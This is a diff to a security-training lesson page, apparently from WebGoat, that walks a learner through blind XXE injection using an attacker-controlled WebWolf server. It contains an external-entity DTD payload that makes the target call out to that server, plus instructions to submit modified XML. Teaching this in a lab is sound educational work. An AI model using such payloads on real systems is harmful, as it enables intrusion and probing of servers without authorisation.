@@ -5,7 +5,7 @@ Or the resource you are trying to read contains illegal XML character which caus
 Let's start with an example, in this case we reference an external DTD which we control on our own server.
 
 As an attacker you have WebWolf under your control (*this can be any server under your control.*), you can for example
-use this server to ping it using `webWolfLink:landing[noLink]`
+use this server to ping it using `webWolfRootLink:landing[noLink]`
 
 How do we use this endpoint to verify whether we can perform XXE?
 
@@ -14,7 +14,7 @@ We can again use WebWolf to host a file called `attack.dtd`, create this file wi
 [source, subs="macros, specialcharacters"]
 ----
 <?xml version="1.0" encoding="UTF-8"?>
-<!ENTITY ping SYSTEM 'webWolfLink:landing[noLink]'>
+<!ENTITY ping SYSTEM 'webWolfRootLink:landing[noLink]'>
 ----
 
 Now submit the form change the xml using to:
@@ -37,7 +37,7 @@ Now in WebWolf browse to 'Incoming requests' and you will see:
 ----
 {
   "method" : "GET",
-  "path" : "/ping",
+  "path" : "/landing",
   "headers" : {
     "request" : {
       "user-agent" : "Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0",
